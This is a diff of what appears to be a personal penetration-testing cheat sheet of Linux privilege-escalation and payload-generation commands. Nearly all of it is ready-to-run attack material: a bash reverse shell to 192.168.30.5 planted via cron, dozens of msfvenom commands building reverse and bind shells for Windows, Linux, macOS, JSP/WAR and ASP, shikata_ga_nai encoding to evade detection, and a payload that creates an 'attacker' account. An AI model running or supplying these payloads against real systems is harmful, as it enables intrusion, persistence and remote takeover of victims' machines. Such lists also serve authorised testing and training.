@@ -1,13 +1,10 @@
 1. Command to find world writable file in linux 		(Used in linux privilage excallation by using file permission issue)
-
 find / -perm -2 ! -type l -ls 2>/dev/null                       
 
 2. To give the shell from linux cron job			(Used for linux privilage escalation, executed from chronjob)
-
 bash -i >& /dev/tcp/192.168.30.5/443 0>&1
 
 3. To create payload
-
 - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f
 js_le -e generic/none
 
@@ -28,11 +25,63 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.41 LPORT=4445 -f asp -
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.11.0.41 LPORT=443 -a x86 --platform Windows -f exe -e x86/shikata_ga_nai -o rmetershell-en.exe
 
 6. Payload with exitfunction thread - It will not crash the application
-
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.11.0.41 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
 7. Reverse sell payload for MS12-037 in format unicode character
-
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -a x86 -f js_le --platform Windows -e generic/none
+## Encoder : x86/shikata_ga_nai
 
-Encoder : x86/shikata_ga_nai
+8. War file 
+ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
+ 
+9. Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
+
+10. Python
+msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
+
+11. Linux Payloads
+
+Reverse Shell:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf >reverse.elf
+
+Bind Shell:
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
+
+Generic Shell:
+msfvenom -p generic/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > term.elf
+
+12. MAC Paylaods
+Reverse Shell:
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
+
+Bind Shell:
+msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
+
+13. Web Based Payloads
+
+ASP
+Reverse shell :
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
+
+JSP
+Reverse shell:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
+
+14. Windows Paylaods
+Reverse Shell :
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
+
+Bind Shell:
+msfvenom -p windows/meterpreter/bind_tcp RHOST= (IP Address) LPORT=(Your Port) -f exe > bind.exe
+
+Create User:
+msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
+
+CMD shell:
+msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
+
+Encoder:
+msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
+
+One can also use the -a to specify the architecture or the --platform
